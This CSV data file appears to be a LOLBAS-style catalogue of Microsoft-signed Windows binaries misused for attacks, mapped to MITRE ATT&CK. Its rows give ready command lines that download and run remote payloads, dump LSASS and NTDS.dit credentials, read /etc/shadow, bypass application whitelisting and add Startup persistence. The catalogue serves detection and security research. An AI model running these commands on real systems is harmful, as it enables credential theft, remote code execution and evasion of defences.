Category,Name,Description,Created,Command,Command Description,Command Category,Command Usecase,Command Privileges,Command OperatingSystem,Command MitreID
OtherMSBinaries,msxsl.exe,Command line utility used to perform XSL transformations.,2018-05-25,msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml,Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).,Execute,Local execution of remote script stored in XSL script stored as an XML file.,User,Windows,T1218
OtherMSBinaries,msxsl.exe,Command line utility used to perform XSL transformations.,2018-05-25,msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml,Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).,AWL Bypass,Local execution of remote script stored in XSL script stored as an XML file.,User,Windows,T1218
OtherMSBinaries,VisualUiaVerifyNative.exe,A Windows SDK binary for manual and automated testing of Microsoft UI Automation implementation and controls.,2021-09-26,VisualUiaVerifyNative.exe,Generate Serialized gadget and save to - C:\Users\[current user]\AppData\Roaminguiverify.config before executing.,AWL Bypass,Execute proxied payload with Microsoft signed binary to bypass WDAC policies,User,Windows 10 2004 (likely previous and newer versions as well),T1218
OtherMSBinaries,Squirrel.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,squirrel.exe --download [url to package],The above binary will go to url and look for RELEASES file and download the nuget package.,Download,Download binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Squirrel.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,squirrel.exe --update [url to package],"The above binary will go to url and look for RELEASES file, download and install the nuget package.",AWL Bypass,Download and execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Squirrel.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,squirrel.exe --update [url to package],"The above binary will go to url and look for RELEASES file, download and install the nuget package.",Execute,Download and execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Squirrel.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,squirrel.exe --updateRoolback=[url to package],"The above binary will go to url and look for RELEASES file, download and install the nuget package.",AWL Bypass,Download and execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Squirrel.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,squirrel.exe --updateRollback=[url to package],"The above binary will go to url and look for RELEASES file, download and install the nuget package.",Execute,Download and execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Powerpnt.exe,Microsoft Office binary.,2019-07-19,"Powerpnt.exe ""http://192.168.1.10/TeamsAddinLoader.dll""",Downloads payload from remote server,Download,It will download a remote payload and place it in the cache folder,User,Windows,T1105
OtherMSBinaries,adplus.exe,Debugging tool included with Windows Debugging Tools,2021-09-01,adplus.exe -hang -pn lsass.exe -o c:\users\mr.d0x\output\folder -quiet,Creates a memory dump of the lsass process,Dump,Create memory dump and parse it offline,SYSTEM,All Windows,T1003.001
OtherMSBinaries,Excel.exe,Microsoft Office binary,2019-07-19,Excel.exe http://192.168.1.10/TeamsAddinLoader.dll,Downloads payload from remote server,Download,It will download a remote payload and place it in the cache folder,User,Windows,T1105
OtherMSBinaries,Devtoolslauncher.exe,Binary will execute specified binary. Part of VS/VScode installation.,2019-10-04,"devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] ""argument here"" test",The above binary will execute other binary.,Execute,Execute any binary with given arguments and it will call developertoolssvc.exe. developertoolssvc is actually executing the binary. https://i.imgur.com/Go7rc0I.png,User,Windows 7 and up with VS/VScode installed,T1127
OtherMSBinaries,Devtoolslauncher.exe,Binary will execute specified binary. Part of VS/VScode installation.,2019-10-04,"devtoolslauncher.exe LaunchForDebug [PATH_TO_BIN] ""argument here"" test",The above binary will execute other binary.,Execute,Execute any binary with given arguments.,User,Windows 7 and up with VS/VScode installed,T1127
OtherMSBinaries,Wsl.exe,Windows subsystem for Linux executable,2019-06-27,wsl.exe -e /mnt/c/Windows/System32/calc.exe,Executes calc.exe from wsl.exe,Execute,"Performs execution of specified file, can be used to execute arbitrary Linux commands.",User,"Windows 10, Windows 19 Server",T1202
OtherMSBinaries,Wsl.exe,Windows subsystem for Linux executable,2019-06-27,wsl.exe -u root -e cat /etc/shadow,Cats /etc/shadow file as root,Execute,Performs execution of arbitrary Linux commands as root without need for password.,User,"Windows 10, Windows 19 Server",T1202
OtherMSBinaries,Wsl.exe,Windows subsystem for Linux executable,2019-06-27,wsl.exe --exec bash -c 'cat file',Cats /etc/shadow file as root,Execute,Performs execution of arbitrary Linux commands.,User,"Windows 10, Windows 19 Server",T1202
OtherMSBinaries,Wsl.exe,Windows subsystem for Linux executable,2019-06-27,wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',Downloads file from 192.168.1.10,Download,Download file,User,"Windows 10, Windows 19 Server",T1202
OtherMSBinaries,vsjitdebugger.exe,Just-In-Time (JIT) debugger included with Visual Studio,2018-05-25,Vsjitdebugger.exe calc.exe,Executes calc.exe as a subprocess of Vsjitdebugger.exe.,Execute,Execution of local PE file as a subprocess of Vsjitdebugger.exe.,User,Windows,T1127
OtherMSBinaries,Winword.exe,Microsoft Office binary,2019-07-19,"winword.exe ""http://192.168.1.10/TeamsAddinLoader.dll""",Downloads payload from remote server,Download,It will download a remote payload and place it in the cache folder,User,Windows,T1105
OtherMSBinaries,AgentExecutor.exe,Intune Management Extension included on Intune Managed Devices,2020-07-23,"AgentExecutor.exe -powershell ""c:\temp\malicious.ps1"" ""c:\temp\test.log"" ""c:\temp\test1.log"" ""c:\temp\test2.log"" 60000 ""C:\Windows\SysWOW64\WindowsPowerShell\v1.0"" 0 1",Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument,Execute,Execute unsigned powershell scripts,User,Windows 10,T1218
OtherMSBinaries,AgentExecutor.exe,Intune Management Extension included on Intune Managed Devices,2020-07-23,"AgentExecutor.exe -powershell ""c:\temp\malicious.ps1"" ""c:\temp\test.log"" ""c:\temp\test1.log"" ""c:\temp\test2.log"" 60000 ""C:\temp\"" 0 1","If we place a binary named powershell.exe in the path c:\temp, agentexecutor.exe will execute it successfully",Execute,Execute a provided EXE,User,Windows 10,T1218
OtherMSBinaries,Fsi.exe,64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.,2021-09-26,fsi.exe c:\path\to\test.fsscript,Execute F# code via script file,AWL Bypass,Execute payload with Microsoft signed binary to bypass WDAC policies,User,Windows 10 2004 (likely previous and newer versions as well),T1059
OtherMSBinaries,Fsi.exe,64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.,2021-09-26,fsi.exe,Execute F# code via interactive command line,AWL Bypass,Execute payload with Microsoft signed binary to bypass WDAC policies,User,Windows 10 2004 (likely previous and newer versions as well),T1059
OtherMSBinaries,Sqlps.exe,"Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\100 and 110 are Powershell v2. Microsoft SQL Server\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.",2018-05-25,Sqlps.exe -noprofile,Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.,Execute,Execute PowerShell commands without ScriptBlock logging.,User,Windows,T1218
OtherMSBinaries,Wfc.exe,The Workflow Command-line Compiler tool is included with the Windows Software Development Kit (SDK).,2021-09-26,wfc.exe c:\path\to\test.xoml,Execute arbitrary C# code embedded in a XOML file.,AWL Bypass,Execute proxied payload with Microsoft signed binary to bypass WDAC policies,User,Windows 10 2004 (likely previous and newer versions as well),T1127
OtherMSBinaries,Remote.exe,Debugging tool included with Windows Debugging Tools,2021-06-01,"Remote.exe /s ""powershell.exe"" anythinghere",Spawns powershell as a child process of remote.exe,AWL Bypass,Executes a process under a trusted Microsoft signed binary,User,,T1127
OtherMSBinaries,Remote.exe,Debugging tool included with Windows Debugging Tools,2021-06-01,"Remote.exe /s ""powershell.exe"" anythinghere",Spawns powershell as a child process of remote.exe,Execute,Executes a process under a trusted Microsoft signed binary,User,,T1127
OtherMSBinaries,Remote.exe,Debugging tool included with Windows Debugging Tools,2021-06-01,"Remote.exe /s ""\\10.10.10.30\binaries\file.exe"" anythinghere",Run a remote file,Execute,Executing a remote binary without saving file to disk,User,,T1127
OtherMSBinaries,FsiAnyCpu.exe,32/64-bit FSharp (F#) Interpreter included with Visual Studio.,2021-09-26,fsianycpu.exe c:\path\to\test.fsscript,Execute F# code via script file,AWL Bypass,Execute payload with Microsoft signed binary to bypass WDAC policies,User,Windows 10 2004 (likely previous and newer versions as well),T1059
OtherMSBinaries,FsiAnyCpu.exe,32/64-bit FSharp (F#) Interpreter included with Visual Studio.,2021-09-26,fsianycpu.exe,Execute F# code via interactive command line,AWL Bypass,Execute payload with Microsoft signed binary to bypass WDAC policies,User,Windows 10 2004 (likely previous and newer versions as well),T1059
OtherMSBinaries,Bginfo.exe,Background Information Utility included with SysInternals Suite,2018-05-25,bginfo.exe bginfo.bgi /popup /nolicprompt,Execute VBscript code that is referenced within the bginfo.bgi file.,Execute,Local execution of VBScript,User,Windows,T1218
OtherMSBinaries,Bginfo.exe,Background Information Utility included with SysInternals Suite,2018-05-25,bginfo.exe bginfo.bgi /popup /nolicprompt,Execute VBscript code that is referenced within the bginfo.bgi file.,AWL Bypass,Local execution of VBScript,User,Windows,T1218
OtherMSBinaries,Bginfo.exe,Background Information Utility included with SysInternals Suite,2018-05-25,\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt,Execute bginfo.exe from a WebDAV server.,Execute,Remote execution of VBScript,User,Windows,T1218
OtherMSBinaries,Bginfo.exe,Background Information Utility included with SysInternals Suite,2018-05-25,\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt,Execute bginfo.exe from a WebDAV server.,AWL Bypass,Remote execution of VBScript,User,Windows,T1218
OtherMSBinaries,Bginfo.exe,Background Information Utility included with SysInternals Suite,2018-05-25,\\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt,This style of execution may not longer work due to patch.,Execute,Remote execution of VBScript,User,Windows,T1218
OtherMSBinaries,Bginfo.exe,Background Information Utility included with SysInternals Suite,2018-05-25,\\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt,This style of execution may not longer work due to patch.,AWL Bypass,Remote execution of VBScript,User,Windows,T1218
OtherMSBinaries,DefaultPack.EXE,This binary can be downloaded along side multiple software downloads on the microsoft website. It gets downloaded when the user forgets to uncheck the option to set Bing as the default search provider.,2020-10-01,"DefaultPack.EXE /C:""process.exe args""","Use DefaultPack.EXE to execute arbitrary binaries, with added argument support.",Execute,"Can be used to execute stagers, binaries, and other malicious commands.",User,Windows,T1218
OtherMSBinaries,Procdump(64).exe,SysInternals Memory Dump Tool,2020-10-14,procdump.exe -md calc.dll explorer.exe,Loads calc.dll where DLL is configured with a 'MiniDumpCallbackRoutine' exported function. Valid process must be provided as dump still created.,Execute,Performs execution of unsigned DLL.,User,"Windows 8.1 and higher, Windows Server 2012 and higher.",T1202
OtherMSBinaries,Procdump(64).exe,SysInternals Memory Dump Tool,2020-10-14,procdump.exe -md calc.dll foobar,"Loads calc.dll where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary.",Execute,Performs execution of unsigned DLL.,User,"Windows 8.1 and higher, Windows Server 2012 and higher.",T1202
OtherMSBinaries,Msdeploy.exe,Microsoft tool used to deploy Web Applications.,2018-05-25,"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\temp\calc.bat""",Launch calc.bat via msdeploy.exe.,Execute,Local execution of batch file using msdeploy.exe.,User,Windows server,T1218
OtherMSBinaries,Msdeploy.exe,Microsoft tool used to deploy Web Applications.,2018-05-25,"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\temp\calc.bat""",Launch calc.bat via msdeploy.exe.,AWL bypass,Local execution of batch file using msdeploy.exe.,User,Windows server,T1218
OtherMSBinaries,Sqldumper.exe,Debugging utility included with Microsoft SQL.,2018-05-25,sqldumper.exe 464 0 0x0110,Dump process by PID and create a dump file (Appears to create a dump file called SQLDmprXXXX.mdmp).,Dump,Dump process using PID.,Administrator,Windows,T1003
OtherMSBinaries,Sqldumper.exe,Debugging utility included with Microsoft SQL.,2018-05-25,sqldumper.exe 540 0 0x01100:40,0x01100:40 flag will create a Mimikatz compatible dump file.,Dump,Dump LSASS.exe to Mimikatz compatible dump using PID.,Administrator,Windows,T1003.001
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,Update.exe --download [url to package],The above binary will go to url and look for RELEASES file and download the nuget package.,Download,Download binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,Update.exe --update=[url to package],"The above binary will go to url and look for RELEASES file, download and install the nuget package.",AWL Bypass,Download and execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,Update.exe --update=[url to package],"The above binary will go to url and look for RELEASES file, download and install the nuget package.",Execute,Download and execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,Update.exe --update=\\remoteserver\payloadFolder,"The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",AWL Bypass,Download and execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,Update.exe --update=\\remoteserver\payloadFolder,"The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",Execute,Download and execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,Update.exe --updateRollback=[url to package],"The above binary will go to url and look for RELEASES file, download and install the nuget package.",AWL Bypass,Download and execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,Update.exe --updateRollback=[url to package],"The above binary will go to url and look for RELEASES file, download and install the nuget package.",Execute,Download and execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,"Update.exe --processStart payload.exe --process-start-args ""whatever args""",Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.,AWL Bypass,Application Whitelisting Bypass,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,Update.exe --updateRollback=\\remoteserver\payloadFolder,"The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",AWL Bypass,Download and execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,Update.exe --updateRollback=\\remoteserver\payloadFolder,"The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",Execute,Download and execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,"Update.exe --processStart payload.exe --process-start-args ""whatever args""",Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.,Execute,Execute binary,User,Windows 7 and up with Microsoft Teams installed,T1218
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,Update.exe --createShortcut=payload.exe -l=Startup,"Copy your payload into ""%localappdata%\Microsoft\Teams\current\"". Then run the command. Update.exe will create a payload.exe shortcut in ""%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"". Then payload will run on every login of the user who runs it.",Execute,Execute binary,User,Windows 7 and up with Microsoft Teams installed,T1547
OtherMSBinaries,Update.exe,Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.,2019-06-26,Update.exe --removeShortcut=payload.exe -l=Startup,"Run the command to remove the shortcut created in the ""%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"" directory you created with the LolBinExecution ""--createShortcut"" described on this page.",Execute,Execute binary,User,Windows 7 and up with Microsoft Teams installed,T1070
OtherMSBinaries,te.exe,Testing tool included with Microsoft Test Authoring and Execution Framework (TAEF).,2018-05-25,te.exe bypass.wsc,Run COM Scriptlets (e.g. VBScript) by calling a Windows Script Component (WSC) file.,Execute,Execute Visual Basic script stored in local Windows Script Component file.,User,Windows,T1127
OtherMSBinaries,coregen.exe,"Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within ""C:\Program Files (x86)\Microsoft Silverlight\5.1.50918.0\"" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.",2020-10-09,coregon.exe.exe /L C:\folder\evil.dll dummy_assembly_name,Loads the target .DLL in arbitrary path specified with /L.,Execute,Execute DLL code,User,Windows,T1055
OtherMSBinaries,coregen.exe,"Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within ""C:\Program Files (x86)\Microsoft Silverlight\5.1.50918.0\"" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.",2020-10-09,coregen.exe dummy_assembly_name,Loads the coreclr.dll in the corgen.exe directory (e.g. C:\Program Files\Microsoft Silverlight\5.1.50918.0).,Execute,Execute DLL code,User,Windows,T1055
OtherMSBinaries,coregen.exe,"Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within ""C:\Program Files (x86)\Microsoft Silverlight\5.1.50918.0\"" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.",2020-10-09,coregen.exe /L C:\folder\evil.dll dummy_assembly_name,Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions.,AWL Bypass,Execute DLL code,User,Windows,T1218
OtherMSBinaries,rcsi.exe,Non-Interactive command line inerface included with Visual Studio.,2018-05-25,rcsi.exe bypass.csx,Use embedded C# within the csx script to execute the code.,Execute,Local execution of arbitrary C# code stored in local CSX file.,User,Windows,T1127
OtherMSBinaries,rcsi.exe,Non-Interactive command line inerface included with Visual Studio.,2018-05-25,rcsi.exe bypass.csx,Use embedded C# within the csx script to execute the code.,AWL Bypass,Local execution of arbitrary C# code stored in local CSX file.,User,Windows,T1127
OtherMSBinaries,ntdsutil.exe,Command line utility used to export Active Directory.,2020-01-10,"ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\"" q q",Dump NTDS.dit into folder,Dump,Dumping of Active Directory NTDS.dit database,Administrator,Windows,T1003.003
OtherMSBinaries,csi.exe,Command line interface included with Visual Studio.,2018-05-25,csi.exe file,Use csi.exe to run unsigned C# code.,Execute,Local execution of unsigned C# code.,User,Windows,T1127
OtherMSBinaries,Cdb.exe,Debugging tool included with Windows Debugging Tools.,2018-05-25,cdb.exe -cf x64_calc.wds -o notepad.exe,Launch 64-bit shellcode from the x64_calc.wds file using cdb.exe.,Execute,Local execution of assembly shellcode.,User,Windows,T1127
OtherMSBinaries,Cdb.exe,Debugging tool included with Windows Debugging Tools.,2018-05-25,"cdb.exe -pd -pn <process_name>
.shell <cmd>
",Attaching to any process and executing shell commands,Execute,Run a shell command under a trusted Microsoft signed binary,User,Windows,T1127
